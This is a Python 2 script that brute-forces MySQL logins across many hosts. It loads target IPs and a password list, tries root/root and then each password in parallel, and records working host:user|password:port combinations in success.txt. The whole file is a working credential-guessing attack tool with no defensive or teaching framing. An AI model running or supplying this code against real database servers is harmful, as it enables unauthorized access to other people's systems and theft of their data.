# -*- coding:utf-8 -*-

import pymysql
import time
import multiprocessing
import ConfigParser



def success(x):
    with open('success.txt', 'a+')as a:
        a.write(x + "\n")


def failed(x):
    name = '端口开放_密码错误'.decode('utf-8') + '.txt'
    with open(name, 'a+')as a:
        a.write(x + "\n")


def check(ip, port):
    print 'Check IP Alive : ' + ip
    try:
        connx = pymysql.connect(host=ip, user='root', passwd='root', db='mysql', port=port,connect_timeout=5)
        cur = connx.cursor()
        sql = 'show databases;'
        cur.execute(sql)
        res = cur.fetchall()
        if 'Learn' in res:
            failed(ip)
        else:
            res = ip + ':' + 'root' + '|' + 'root' + ':' + str(port)
            success(res)
            return '777'
    except Exception, e:
        print e
        if str(e).find('Access denied') != -1:
            failed(ip)
        elif (str(e).find('many connections') != -1):
            # 连接过多,暂停1秒
            time.sleep(1)
            pass
        elif (str(e).find('Can\'t connect') != -1):
            # 端口未开放,退出
            return '666'
        elif (str(e).find('Lost connection') != -1):
            # 端口未开放,退出
            return '666'
        elif (str(e).find('not allowed') != -1):
            # 端口未开放,退出
            return '666'
        else:
            # 其他错误，记录并退出
            pass


def scan(ip,username,passwords,port):
    ress = check(ip, port)
    if ress == '666':
        return
    elif ress == '777':
        return
    else:
        for password in passwords:
            print 'Scan : ' + ip + ':' + username + '|' + password + ':' + str(port)
            try:
                connx = pymysql.connect(host=ip, user=username, passwd=str(password), db='mysql', port=port,connect_timeout=3)
                cur = connx.cursor()
                sql = 'show databases;'
                cur.execute(sql)
                res = cur.fetchall()
                if 'Learn' in res:
                    failed(ip)
                else:
                    res = ip + ':' + username + '|' + password + ':' + str(port)
                    success(res)
                    return
            except Exception, e:
                print e


if __name__ == '__main__':
    multiprocessing.freeze_support()
    cfg = ConfigParser.ConfigParser()
    cfg.read('Config.ini')
    user = cfg.get("Config", "user")
    thread_s = int(cfg.get("Config", "threads"))
    port = int(cfg.get("Config", "port"))

    New_start = raw_input(unicode('导入IP:', 'utf-8').encode('gbk'))  # line:190
    New_start = New_start.replace('"', '').replace("'", '')
    IP_list = list(set([x.strip() for x in open(New_start,'r').readlines()]))

    Password_list_ = list(set([x.strip() for x in open('password.txt','r').readlines()]))

    p = multiprocessing.Pool(thread_s)

    for ip in IP_list:
        p.apply_async(scan, args=(ip,user,Password_list_,port))
    p.close()
    p.join()

